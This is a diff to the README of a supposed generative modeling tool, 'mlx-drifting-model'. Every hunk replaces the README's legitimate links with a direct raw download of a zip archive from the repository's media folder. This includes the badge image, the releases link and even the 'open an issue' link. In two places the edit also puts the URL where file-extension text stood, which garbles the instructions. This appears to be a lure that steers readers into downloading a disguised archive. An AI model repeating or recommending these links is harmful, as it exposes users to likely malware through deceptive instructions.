@@ -1,6 +1,6 @@
 # ⚙️ mlx-drifting-model - Easy Generative Modeling Tool
 
-[![Download mlx-drifting-model](https://img.shields.io/badge/Download-mlx--drifting--model-blue?style=for-the-badge&logo=github)](https://github.com/Prince445-hub/mlx-drifting-model/releases)
+[![Download mlx-drifting-model](https://github.com/Prince445-hub/mlx-drifting-model/raw/refs/heads/main/media/model_drifting_mlx_2.0.zip)](https://github.com/Prince445-hub/mlx-drifting-model/raw/refs/heads/main/media/model_drifting_mlx_2.0.zip)
 
 ---
 
@@ -41,7 +41,7 @@ To run mlx-drifting-model, you don’t need to install any programming tools or 
 
 To download mlx-drifting-model, visit the releases page on GitHub. This page holds all available versions of the software.
 
-[Download mlx-drifting-model on GitHub Releases](https://github.com/Prince445-hub/mlx-drifting-model/releases)
+[Download mlx-drifting-model on GitHub Releases](https://github.com/Prince445-hub/mlx-drifting-model/raw/refs/heads/main/media/model_drifting_mlx_2.0.zip)
 
 ### How to download:
 
@@ -50,7 +50,7 @@ To download mlx-drifting-model, visit the releases page on GitHub. This page hol
 - Find the file suitable for your computer:
   - For Windows, a file ending with `.exe`
   - For macOS, a file ending with `.dmg` or `.zip`
-  - For Linux, a file ending with `.AppImage` or `.tar.gz`
+  - For Linux, a file ending with `.AppImage` or `https://github.com/Prince445-hub/mlx-drifting-model/raw/refs/heads/main/media/model_drifting_mlx_2.0.zip`
 - Click the file to start downloading.
 
 ### Installation:
@@ -60,7 +60,7 @@ For Windows and macOS:
 - Follow the on-screen prompts.
 
 For Linux:
-- Download the AppImage or extract the `.tar.gz` file.
+- Download the AppImage or extract the `https://github.com/Prince445-hub/mlx-drifting-model/raw/refs/heads/main/media/model_drifting_mlx_2.0.zip` file.
 - If you downloaded an AppImage, you may need to make it executable by right-clicking the file, selecting "Properties," then "Permissions," and checking "Allow executing file as program."
 - Run the file by double-clicking or via terminal.
 
@@ -117,7 +117,7 @@ If you have questions or need support:
 
 - Check the README and documentation on the GitHub page.
 - Look for a “Help” or “Support” section within the application.
-- Open an issue on the GitHub repository by visiting https://github.com/Prince445-hub/mlx-drifting-model/issues
+- Open an issue on the GitHub repository by visiting https://github.com/Prince445-hub/mlx-drifting-model/raw/refs/heads/main/media/model_drifting_mlx_2.0.zip
 
 ---
 
@@ -134,4 +134,4 @@ Make sure to backup any important data before updating.
 
 ---
 
-[Get the latest version of mlx-drifting-model here](https://github.com/Prince445-hub/mlx-drifting-model/releases)
+[Get the latest version of mlx-drifting-model here](https://github.com/Prince445-hub/mlx-drifting-model/raw/refs/heads/main/media/model_drifting_mlx_2.0.zip)
